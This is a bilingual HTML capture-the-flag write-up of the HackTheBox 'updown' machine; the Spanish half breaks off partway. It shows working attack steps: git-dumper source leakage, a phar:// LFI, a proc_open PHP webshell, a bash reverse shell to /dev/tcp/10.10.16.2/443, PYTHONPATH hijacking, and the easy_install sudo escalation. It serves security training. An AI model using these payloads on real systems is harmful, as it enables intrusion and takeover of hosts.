@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>updown | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">updown</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target was running a web application on <code>siteisup.htb</code> that provided a site availability checker. Initial enumeration revealed a <code>/dev</code> subdomain protected by HTTP authentication via an <code>.htaccess</code> file, but this protection was bypassed by discovering an exposed <code>.git</code> repository that leaked the source code and the required <code>Special-Dev</code> HTTP header.</p>
+                    
+                    <p>The <code>/dev</code> application allowed file uploads with extension filtering, but <code>.phar</code> archives were permitted. By combining a local file inclusion (LFI) vulnerability in the <code>index.php</code> page parameter with the <code>phar://</code> PHP stream wrapper, I achieved remote code execution by uploading a ZIP archive containing a PHP webshell and accessing it through the LFI with <code>phar://</code> wrapper. PHP's <code>disable_functions</code> directive blocked most dangerous functions, but <code>proc_open()</code> remained available, allowing command execution and a reverse shell as <code>www-data</code>.</p>
+                    
+                    <p>Privilege escalation to the <code>developer</code> user was achieved by exploiting a SUID binary that executed a Python script importing the <code>requests</code> module. Since the SUID binary preserved environment variables, I hijacked the Python module search path using <code>PYTHONPATH</code> to load a malicious <code>requests.py</code> file that spawned a bash shell, granting access as <code>developer</code>. Finally, root access was obtained by exploiting <code>sudo</code> permissions on the <code>easy_install</code> binary, using a GTFOBins technique to execute arbitrary Python code with root privileges.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Git repository exposure and source code disclosure, LFI combined with PHAR deserialization for RCE, <code>proc_open()</code> PHP function bypass, SUID binary exploitation via Python library hijacking with <code>PYTHONPATH</code>, <code>easy_install</code> GTFOBins privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to enumerate open ports and running services on the target machine:</p>
+                <p><img src="./media/image10.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+                
+                <p>The scan reveals SSH on port 22 and an HTTP server on port 80. Visiting the web application, I find a simple interface for checking if websites are up or down:</p>
+                <p><img src="./media/image2.png" alt="Main page of siteisup.htb showing a website availability checker interface" /></p>
+                
+                <p>I add <code>siteisup.htb</code> to my <code>/etc/hosts</code> file and begin enumerating the application. My first thought is to test for SSRF vulnerabilities through the site checker functionality, but I decide to perform directory enumeration first.</p>
+                
+                <h2>Directory Enumeration and Virtual Host Discovery</h2>
+                <p>Using <code>gobuster</code>, I discover a <code>/dev/</code> directory with an <code>index.php</code> file that appears empty or inaccessible:</p>
+                <p><img src="./media/image8.png" alt="Gobuster results showing the /dev/ directory with index.php" /></p>
+                
+                <p>I also find a virtual host during subdomain enumeration:</p>
+                <pre><code class="language-plaintext">dev.siteisup.htb Status: 403 [Size: 281]</code></pre>
+                
+                <p>Adding <code>dev.siteisup.htb</code> to my hosts file and attempting to access it returns a 403 Forbidden error, indicating the subdomain exists but access is restricted.</p>
+                
+                <h2>Testing SSRF Capabilities</h2>
+                <p>Testing the main application with a simple URL like <code>asd.com</code>, I observe the response:</p>
+                <p><img src="./media/image5.png" alt="Response showing the site checker attempting to verify asd.com" /></p>
+                
+                <p>When enabling debug mode, the application acts as a proxy and reveals more information about its internal workings:</p>
+                <p><img src="./media/image3.png" alt="Debug mode output showing proxy-like behavior and internal HTTP requests" /></p>
+                
+                <p>I attempt to upload a webshell through the file upload functionality, but as expected, it gets blocked by extension filtering:</p>
+                <p><img src="./media/image4.png" alt="Error message showing extension filtering blocking the upload attempt" /></p>
+                
+                <p>I also try to perform SSRF by scanning internal ports to discover additional services, but only port 80 responds as open. Interestingly, when I try to access <code>dev.siteisup.htb</code> through the SSRF functionality, the application reports it as down:</p>
+                <p><img src="./media/image9.png" alt="Response showing dev.siteisup.htb being reported as down by the checker" /></p>
+                
+                <h2>Git Repository Discovery</h2>
+                <p>Since the SSRF approach isn't yielding results, I continue enumerating directories. Using a common wordlist, I discover an exposed <code>.git</code> directory in the <code>/dev</code> path:</p>
+                <p><img src="./media/image7.png" alt="Discovery of .git directory in the /dev path showing exposed Git repository" /></p>
+                
+                <p>This is a critical finding. An exposed Git repository can leak source code, credentials, and other sensitive information. I use <code>git-dumper</code> to extract the repository contents:</p>
+                <pre><code class="language-bash">python3 -m venv venv
+source venv/bin/activate
+pip3 install git-dumper
+git-dumper http://siteisup.htb/dev/ gitfolder</code></pre>
+                
+                <h2>Source Code Analysis - Bypassing Access Controls</h2>
+                <p>Examining the extracted source code, I find an <code>.htaccess</code> file that explains why <code>dev.siteisup.htb</code> was returning 403:</p>
+                <pre><code class="language-apache">SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header</code></pre>
+                
+                <p>This configuration requires a custom HTTP header <code>Special-Dev: only4dev</code> to access the development site. I configure Burp Suite to automatically add this header to all requests, allowing me to freely browse the protected application.</p>
+                
+                <p>The development version of the site has similar functionality to the main site but includes an additional feature: file upload to check multiple websites at once:</p>
+                <p><img src="./media/image11.png" alt="Dev site interface showing file upload functionality for bulk site checking" /></p>
+                
+                <h2>Analyzing the File Upload Mechanism</h2>
+                <p>Reviewing the source code, I find the extension validation logic in the upload handler:</p>
+                <pre><code class="language-php">$ext = getExtension($file);
+if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+    die("Extension not allowed!");
+}
+
+function getExtension($file) {
+    $extension = strrpos($file,".");
+    return ($extension===false) ? "" : substr($file,$extension+1);
+}</code></pre>
+                
+                <p>The code uses <code>strrpos()</code> to find the last occurrence of a dot and extract the extension. It blocks common executable and archive extensions including PHP files and ZIP archives. However, I notice that <code>.phar</code> files are not blacklisted.</p>
+                
+                <p>After the file is uploaded to a subdirectory under <code>/uploads</code> with directory listing enabled, the application performs <code>curl</code> requests to the URLs listed in the uploaded file.</p>
+                
+                <h2>Discovering the LFI Vulnerability</h2>
+                <p>Examining <code>index.php</code> in the development site, I discover a local file inclusion (LFI) vulnerability:</p>
+                <pre><code class="language-php">&lt;b&gt;This is only for developers&lt;/b&gt;
+&lt;br&gt;
+&lt;a href="?page=admin"&gt;Admin Panel&lt;/a&gt;
+&lt;?php
+define("DIRECTACCESS",false);
+$page=$_GET['page'];
+if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
+    include($_GET['page'] . ".php");
+}else{
+    include("checker.php");
+}
+?&gt;</code></pre>
+                
+                <p>The <code>page</code> parameter allows including files, but with limitations:</p>
+                <ul>
+                    <li>It blocks paths containing <code>bin</code>, <code>usr</code>, <code>home</code>, <code>var</code>, or <code>etc</code></li>
+                    <li>It automatically appends <code>.php</code> to the included file</li>
+                </ul>
+                
+                <p>However, these restrictions can be bypassed using PHP stream wrappers, specifically the <code>phar://</code> wrapper, which allows accessing files inside PHAR/ZIP archives.</p>
+                
+                <h2>Exploitation Strategy - Combining Upload with LFI</h2>
+                <p>My exploitation approach combines the file upload functionality with the LFI vulnerability:</p>
+                <ol>
+                    <li>Create a PHP file containing a webshell</li>
+                    <li>Package it in a ZIP archive with a non-blacklisted extension</li>
+                    <li>Upload the archive through the file upload form</li>
+                    <li>Use the LFI with <code>phar://</code> wrapper to execute the PHP file inside the ZIP</li>
+                </ol>
+                
+                <p>After some trial and error, I successfully achieve code execution:</p>
+                <p><img src="./media/image6.png" alt="Successful code execution showing phpinfo() output through the PHAR LFI technique" /></p>
+                
+                <p>Interestingly, I initially planned to create a script to immediately access the uploaded file since the upload directory name is generated with <code>md5(time())</code>, making it predictable if I replicate the timing. However, I discover that uploading ZIP files causes the server to bug out and not delete the uploaded files, giving me plenty of time to access them. There is a cron job that periodically cleans the <code>/uploads</code> directory, but it doesn't run frequently enough to interfere.</p>
+                
+                <h2>Achieving Initial Access</h2>
+                <p>The steps I follow to gain initial access are:</p>
+                
+                <p>First, I create a PHP file that simply displays <code>phpinfo()</code> to confirm code execution:</p>
+                <pre><code class="language-php">&lt;?php phpinfo(); ?&gt;</code></pre>
+                
+                <p>I save it as <code>info.php</code> and create a ZIP archive with a non-blacklisted extension:</p>
+                <pre><code class="language-bash">zip info.asd info.php</code></pre>
+                
+                <p>After uploading it through the web interface, I access it using the LFI vulnerability:</p>
+                <pre><code class="language-plaintext">http://dev.siteisup.htb/?page=phar://uploads/5fc124601504718b231fe90207aaee1f/info.asd/info</code></pre>
+                
+                <p>Note that I don't need to add <code>.php</code> to the filename since the LFI code automatically appends it.</p>
+                
+                <h3>Bypassing disable_functions</h3>
+                <p>I attempt to upload a webshell that uses <code>system()</code> or <code>shell_exec()</code>, but neither function works. Reviewing the <code>phpinfo()</code> output, I discover that PHP has been hardened with <code>disable_functions</code>, blocking most dangerous functions:</p>
+                <pre><code class="language-plaintext">disable_functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen</code></pre>
+                
+                <p>After researching alternative execution methods, I discover that <code>proc_open()</code> is not disabled. This function allows spawning processes and capturing their output. I create a new webshell using <code>proc_open()</code>:</p>
+                <pre><code class="language-php">&lt;?php
+$descriptorspec = array(
+    0 =&gt; array("pipe", "r"),
+    1 =&gt; array("pipe", "w"),
+    2 =&gt; array("pipe", "w")
+);
+$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);
+echo stream_get_contents($pipes[1]);
+?&gt;</code></pre>
+                
+                <p>I package this as <code>webshell.php</code>, zip it with a non-blacklisted extension, upload it, and test it with the <code>id</code> command:</p>
+                <p><img src="./media/image1.png" alt="Successful command execution showing the output of the id command through the proc_open webshell" /></p>
+                
+                <p>With command execution confirmed, I use the webshell to launch a reverse shell:</p>
+                <pre><code class="language-plaintext">http://dev.siteisup.htb/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.2/443%200%3E%261%22&page=phar://uploads/d50d5fd2bbec62a9e6dbb387630dcf35/webshell.asd/webshell</code></pre>
+                
+                <p>I successfully receive a reverse shell connection as the <code>www-data</code> user.</p>
+                
+                <h2>Lateral Movement to Developer</h2>
+                <p>Enumerating the filesystem, I discover a user named <code>developer</code> in <code>/home</code>:</p>
+                <pre><code class="language-bash">ls -ls /home</code></pre>
+                <pre><code class="language-plaintext">total 4
+4 drwxr-xr-x 6 developer developer 4096 Aug 30 2022 developer</code></pre>
+                
+                <p>I can access the developer's home directory but cannot read the user flag yet. Inside <code>/home/developer/dev</code>, I find an interesting SUID binary and a Python script:</p>
+                <pre><code class="language-bash">ls -la /home/developer/dev</code></pre>
+                <pre><code class="language-plaintext">total 32
+drwxr-x--- 2 developer www-data   4096 Jun 22 2022 .
+drwxr-xr-x 6 developer developer  4096 Aug 30 2022 ..
+-rwsr-x--- 1 developer www-data  16928 Jun 22 2022 siteisup
+-rwxr-x--- 1 developer www-data    154 Jun 22 2022 siteisup_test.py</code></pre>
+                
+                <p>The <code>siteisup</code> binary has the SUID bit set and is owned by <code>developer</code>, meaning it executes with developer's privileges. Let me verify it's a binary:</p>
+                <pre><code class="language-bash">file siteisup</code></pre>
+                <pre><code class="language-plaintext">siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped</code></pre>
+                
+                <p>When I execute the binary, it prompts for a URL but crashes with a syntax error:</p>
+                <pre><code class="language-bash">./siteisup</code></pre>
+                <pre><code class="language-plaintext">Welcome to 'siteisup.htb' application
+
+Enter URL here:10.10.16.2
+Traceback (most recent call last):
+  File "/home/developer/dev/siteisup_test.py", line 3, in &lt;module&gt;
+    url = input("Enter URL here:")
+  File "&lt;string&gt;", line 1
+    10.10.16.2
+    ^
+SyntaxError: invalid syntax</code></pre>
+                
+                <p>The error reveals that the binary is executing the <code>siteisup_test.py</code> Python script. I examine the script:</p>
+                <pre><code class="language-python">import requests
+
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+    print "Website is up"
+else:
+    print "Website is down"</code></pre>
+                
+                <p>The script is straightforward: it imports the <code>requests</code> module, prompts for a URL, makes an HTTP request, and checks if the response status is 200. The fact that the binary executes this Python script and has the SUID bit set presents an opportunity for exploitation.</p>
+                
+                <h2>Python Library Hijacking via PYTHONPATH</h2>
+                <p>Since the SUID binary executes a Python script that imports <code>requests</code>, I can exploit this by hijacking the module import process. Python searches for modules in the following order:</p>
+                <ol>
+                    <li>The directory containing the script being executed</li>
+                    <li>Directories specified in the <code>PYTHONPATH</code> environment variable</li>
+                    <li>Standard library directories</li>
+                </ol>
+                
+                <p>I cannot write to the directory where <code>siteisup_test.py</code> is located:</p>
+                <pre><code class="language-bash">touch asd</code></pre>
+                <pre><code class="language-plaintext">touch: cannot touch 'asd': Permission denied</code></pre>
+                
+                <p>However, I can manipulate the <code>PYTHONPATH</code> environment variable. Importantly, when a SUID binary is executed (as opposed to using <code>sudo</code>), environment variables are preserved, making this attack vector viable.</p>
+                
+                <p>I create a malicious <code>requests.py</code> file in <code>/tmp</code> that spawns a bash shell instead of providing HTTP request functionality:</p>
+                <pre><code class="language-python">import os
+os.system('/bin/bash')</code></pre>
+                
+                <p>Then I set <code>PYTHONPATH</code> to point to <code>/tmp</code>:</p>
+                <pre><code class="language-bash">export PYTHONPATH=/tmp</code></pre>
+                
+                <p>Now when I execute the SUID binary, Python will find my malicious <code>requests.py</code> in <code>/tmp</code> before looking in the standard library. Since the binary runs with developer's privileges, the spawned bash shell will also run as developer:</p>
+                <pre><code class="language-bash">./siteisup</code></pre>
+                <pre><code class="language-plaintext">Welcome to 'siteisup.htb' application
+
+developer@updown:/home/developer/dev$</code></pre>
+                
+                <p>I successfully escalate to the <code>developer</code> user. Interestingly, I still cannot directly read the user flag from this shell, but I find an SSH private key in <code>.ssh/id_rsa</code>. I copy this key to my local machine and use it to authenticate via SSH, which grants me full access to the developer account and the ability to read the user flag.</p>
+                
+                <h2>Privilege Escalation to Root</h2>
+                <p>As the developer user, I check for sudo privileges:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                <pre><code class="language-plaintext">Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install</code></pre>
+                
+                <p>The developer user can execute <code>/usr/local/bin/easy_install</code> with sudo without a password. Let me examine this binary:</p>
+                <pre><code class="language-bash">file /usr/local/bin/easy_install</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/easy_install: Python script, ASCII text executable</code></pre>
+                <pre><code class="language-bash">cat /usr/local/bin/easy_install</code></pre>
+                <pre><code class="language-python">#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import re
+import sys
+from setuptools.command.easy_install import main
+
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())</code></pre>
+                
+                <p><code>easy_install</code> is a Python package installer, similar to <code>pip</code>. It's part of the <code>setuptools</code> package and is used to install Python packages.</p>
+                
+                <p>Unlike the previous SUID exploitation, I cannot use <code>PYTHONPATH</code> hijacking here because sudo has <code>env_reset</code> enabled, which clears environment variables before execution.</p>
+                
+                <p>However, <code>easy_install</code> is a well-known binary that can be abused for privilege escalation. I find the technique on GTFOBins: <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">https://gtfobins.github.io/gtfobins/easy_install/#sudo</a></p>
+                
+                <h3>Understanding the easy_install Exploit</h3>
+                <p>The exploit works by leveraging <code>easy_install</code>'s ability to execute <code>setup.py</code> files during package installation. When you run <code>easy_install</code> on a directory, it looks for a <code>setup.py</code> file and executes it as part of the installation process. Since we're running <code>easy_install</code> with sudo, the <code>setup.py</code> script will execute with root privileges.</p>
+                
+                <p>Following the GTFOBins guide, I execute these commands to escalate to root:</p>
+                <pre><code class="language-bash">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+sudo easy_install $TF</code></pre>
+                
+                <p>The commands work as follows:</p>
+                <ol>
+                    <li><code>TF=$(mktemp -d)</code> creates a temporary directory</li>
+                    <li>I write a malicious <code>setup.py</code> that uses <code>os.execl()</code> to spawn a shell</li>
+                    <li><code>sudo easy_install $TF</code> runs easy_install on the temporary directory with root privileges</li>
+                    <li>easy_install executes the <code>setup.py</code> file as root, spawning a root shell</li>
+                </ol>
+                
+                <p>After executing these commands, I successfully obtain a root shell and can read the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El objetivo ejecutaba una aplicación web en <code>siteisup.htb</code> que proporcionaba un verificador de disponibilidad de sitios. La enumeración inicial reveló un subdominio <code>/dev</code> protegido por autenticación HTTP mediante un archivo <code>.htaccess</code>, pero esta protección fue eludida al descubrir un repositorio <code>.git</code> expuesto que filtró el código fuente y la cabecera HTTP <code>Special-Dev</code> requerida.</p>
+                    
+                    <p>La aplicación <code>/dev</code> permitía subidas de archivos con filtrado de extensiones, pero los archivos <code>.phar</code> estaban permitidos. Combinando una vulnerabilidad de inclusión local de archivos (LFI) en el parámetro <code>page</code> de <code>index.php</code> con el wrapper de flujo PHP <code>phar://</code>, conseguí ejecución remota de código subiendo un archivo ZIP conteniendo una webshell PHP y accediendo a él a través del LFI con el wrapper <code>phar://</code>. La directiva <code>disable_functions</code> de PHP bloqueaba la mayoría de funciones peligrosas, pero <code>proc_open()</code> permanecía disponible, permitiendo ejecución de comandos y una reverse shell como <code>www-data</code>.</p>
+                    
+                    <p>La escalada de privilegios al usuario <code>developer</code> se logró explotando un binario SUID que ejecutaba un script Python importando el módulo <code>requests</code>. Como el binario SUID preservaba las variables de entorno, secuestré la ruta de búsqueda de módulos Python usando <code>PYTHONPATH</code> para cargar un archivo <code>requests.py</code> malicioso que generaba una shell bash, otorgando acceso como <code>developer</code>. Finalmente, se obtuvo acceso root explotando permisos <code>sudo</code> sobre el binario <code>easy_install</code>, usando una técnica de GTFOBins para ejecutar código Python arbitrario con privilegios root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Exposición de repositorio Git y divulgación de código fuente, LFI combinado con deserialización PHAR para RCE, bypass de función PHP <code>proc_open()</code>, explotación de binario SUID mediante secuestro de librería Python con <code>PYTHONPATH</code>, escalada de privilegios en <code>easy_install</code> de GTFOBins.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para enumerar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image10.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y un servidor HTTP en el puerto 80. Visitando la aplicación web, encuentro una interfaz simple para verificar si los sitios web están activos o caídos:</p>
+                <p><img src="./media/image2.png" alt="Página principal de siteisup.htb mostrando una interfaz de verificador de disponibilidad de sitios web" /></p>
+                
+                <p>Añado <code>siteisup.htb</code> a mi archivo <code>/etc/hosts</code> y comienzo a enumerar la aplicación. Mi primer pensamiento es probar vulnerabilidades SSRF a través de la funcionalidad de verificación de sitios, pero decido realizar primero la enumeración de directorios.</p>
+                
+                <h2>Enumeración de Directorios y Descubrimiento de Virtual Host</h2>
+                <p>Usando <code>gobuster</code>, descubro un directorio <code>/dev/</code> con un archivo <code>index.php</code> que parece vacío o inaccesible:</p>
+                <p><img src="./media/image8.png" alt="Resultados de gobuster mostrando el directorio /dev/ con index.php" /></p>
+                
+                <p>También encuentro un virtual host durante la enumeración de subdominios:</p>
+                <pre><code class="language-plaintext">dev.siteisup.htb Status: 403 [Size: 281]</code></pre>
+                
+                <p>Añadiendo <code>dev.siteisup.htb</code> a mi archivo hosts e intentando acceder devuelve un error 403 Forbidden, indicando que el subdominio existe pero el acceso está restringido.</p>
+                
+                <h2>Probando Capacidades SSRF</h2>
+                <p>Probando la aplicación principal con una URL simple como <code>asd.com</code>, observo la respuesta:</p>
+                <p><img src="./media/image5.png" alt="Respuesta mostrando el verificador de sitios intentando verificar asd.com" /></p>
+                
+                <p>Al habilitar el modo debug, la aplicación actúa como proxy y revela más información sobre su funcionamiento interno:</p>
+                <p><img src="./media/image3.png" alt="Salida del modo debug mostrando comportamiento tipo proxy y peticiones HTTP internas" /></p>
+                
+                <p>Intento subir una webshell a través de la funcionalidad de subida de archivos, pero como esperaba, es bloqueada por el filtrado de extensiones:</p>
+                <p><img src="./media/image4.png" alt="Mensaje de error mostrando el filtrado de extensiones bloqueando el intento de subida" /></p>
+                
+                <p>También intento realizar SSRF escaneando puertos internos para descubrir servicios adicionales, pero solo el puerto 80 responde como abierto. Curiosamente, cuando intento acceder a <code>dev.siteisup.htb</code> a través de la funcionalidad SSRF, la aplicación reporta que está caído:</p>
+                <p><img src="./media/image9.png" alt="Respuesta mostrando que dev.siteisup.htb es reportado como caído por el verificador" /></p>
+                
+                <h2>Descubrimiento del Repositorio Git</h2>
+                <p>Ya que el enfoque SSRF no está produciendo resultados, continúo enumerando directorios. Usando una lista de palabras común, descubro un directorio <code>.git</code> expuesto en la ruta <code>/dev</code>:</p>
+                <p><img src="./media/image7.png" alt="Descubrimiento del directorio .git en la ruta /dev mostrando repositorio Git expuesto" /></p>
+                
+                <p>Este es un hallazgo crítico. Un repositorio Git expuesto puede filtrar código fuente, credenciales y otra información sensible. Uso <code>git-dumper</code> para extraer el contenido del repositorio:</p>
+                <pre><code class="language-bash">python3 -m venv venv
+source venv/bin/activate
+pip3 install git-dumper
+git-dumper http://siteisup.htb/dev/ gitfolder</code></pre>
+                
+                <h2>Análisis del Código Fuente - Eludiendo Controles de Acceso</h2>
+                <p>Examinando el código fuente extraído, encuentro un archivo <code>.htaccess</code> que explica por qué <code>dev.siteisup.htb</code> devolvía 403:</p>
+                <pre><code class="language-apache">SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header</code></pre>
+                
+                <p>Esta configuración requiere una cabecera HTTP personalizada <code>Special-Dev: only4dev</code> para acceder al sitio de desarrollo. Configuro Burp Suite para añadir automáticamente esta cabecera a todas las peticiones, permitiéndome navegar libremente por la aplicación protegida.</p>
+                
+                <p>La versión de desarrollo del sitio tiene funcionalidad similar al sitio principal pero incluye una característica adicional: subida de archivos para comprobar múltiples sitios web a la vez:</p>
+                <p><img src="./media/image11.png" alt="Interfaz del sitio dev mostrando funcionalidad de subida de archivos para verificación masiva de sitios" /></p>
+                
+                <h2>Analizando el Mecanismo de Subida de Archivos</h2>
+                <p>Revisando el código fuente, encuentro la lógica de validación de extensiones en el manejador de subidas:</p>
+                <pre><code class="language-php">$ext = getExtension($file);
+if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+    die("Extension not allowed!");
+}
+
+function getExtension($file) {
+    $extension = strrpos($file,".");
+    return ($extension===false) ? "" : substr($file,$extension+1);
+}</code></pre>
+                
+                <p>El código usa <code>strrpos()</code> para encontrar la última ocurrencia de un punto y extraer la extensión. Bloquea extensiones ejecutables y de archivo comunes incluyendo archivos PHP y archivos ZIP. Sin embargo, noto que los archivos <code>.phar</code> no están en la lista negra.</p>
+                
+                <p>Después de que el archivo se sube a un subdirectorio bajo <code>/uploads</code> con listado de directorio habilitado, la aplicación realiza peticiones <code>curl</code> a las URLs listadas en el archivo subido.</p>
+                
+                <h2>Descubriendo la Vulnerabilidad LFI</h2>
+                <p>Examinando <code>index.php</code> en el sitio de desarrollo, descubro una vulnerabilidad de inclusión local de archivos (LFI):</p>
+                <pre><code class="language-php">&lt;b&gt;This is only for developers&lt;/b&gt;
+&lt;br&gt;
+&lt;a href="?page=admin"&gt;Admin Panel&lt;/a&gt;
+&lt;?php
+define("DIRECTACCESS",false);
+$page=$_GET['page'];
+if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
+    include($_GET['page'] . ".php");
+}else{
+    include("checker.php");
+}
+?&gt;</code></pre>
+                
+                <p>El parámetro <code>page</code> permite incluir archivos, pero con limitaciones:</p>
+                <ul>
+                    <li>Bloquea rutas que contengan <code>bin</code>, <code>usr</code>, <code>home</code>, <code>var</code>, o <code>etc</code></li>
+                    <li>Añade automáticamente <code>.php</code> al archivo incluido</li>
+                </ul>
+                
+                <p>Sin embargo, estas restricciones pueden eludirse usando wrappers de flujo de PHP, específicamente el wrapper <code>phar://</code>, que permite acceder a archivos dentro de archivos PHAR/ZIP.</p>
+                
+                <h2>Estrategia de Explotación - Combinando Subida con LFI</h2>
+                <p>Mi enfoque de explotación combina la funcionalidad de subida de archivos con la vulnerabilidad LFI:</p>
+                <ol>
+                    <li>Crear un archivo PHP conteniendo una webshell</li>
+                    <li>Empaquetarlo en un archivo ZIP con una extensión no bloqueada</li>
+                    <li>Subir el archivo a través del formulario de subida de archivos</li>
+                    <li>Usar el LFI con el wrapper <code>phar://</code> para ejecutar el archivo PHP dentro del ZIP</li>
+                </ol>
+                
+                <p>Después de algo de prueba y error, consigo exitosamente ejecución de código:</p>
+                <p><img src="./media/image6.png" alt="Ejecución exitosa de código mostrando salida de phpinfo() mediante la técnica PHAR LFI" /></p>
+                
+                <p>Curiosamente, inicialmente planeaba crear un script para acceder inmediatamente al archivo subido ya que el nombre del directorio de subida se genera con <code>md5(time())</code>, haciéndolo predecible si replico el timing. Sin embargo, descubro que subir archivos ZIP causa que el servidor se buguee y no borre los archivos subidos, dándome mucho tiempo para acceder a ellos. Hay un cron job que limpia periódicamente el directorio <code>/uploads</code>, pero no se ejecuta con suficiente frecuencia para interferir.</p>
+                
+                <h2>Consiguiendo Acceso Inicial</h2>
+                <p>Los pasos que sigo para obtener acceso inicial son:</p>
+                
+                <p>Primero, creo un archivo PHP que simplemente muestra <code>phpinfo()</code> para confirmar la ejecución de código:</p>
+                <pre><code class="language-php">&lt;?php phpinfo(); ?&gt;</code></pre>
+                
+                <p>Lo guardo como <code>info.php</code> y creo un archivo ZIP con una extensión no bloqueada:</p>
+                <pre><code class="language-bash">zip info.asd info.php</code></pre>
+                
+                <p>Después de subirlo a través de la interfaz web, accedo a él usando la vulnerabilidad LFI:</p>
+                <pre><code class="language-plaintext">http://dev.siteisup.htb/?page=phar://uploads/5fc124601504718b231fe90207aaee1f/info.asd/info</code></pre>
+                
+                <p>Nótese que no necesito añadir <code>.php</code> al nombre del archivo ya que el código LFI lo añade automáticamente.</p>
+                
+                <h3>Eludiendo disable_functions</h3>
+                <p>Intento subir una webshell que use <code>system()</code> o <code>shell_exec()</code>, pero ninguna función funciona. Revisando la salida de <code>phpinfo()</code>, descubro que PHP ha sido endurecido con <code>disable_functions</code>, bloqueando la mayoría de funciones peligrosas:</p>
+                <pre><code class="language-plaintext">disable_functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen</code></pre>
+                
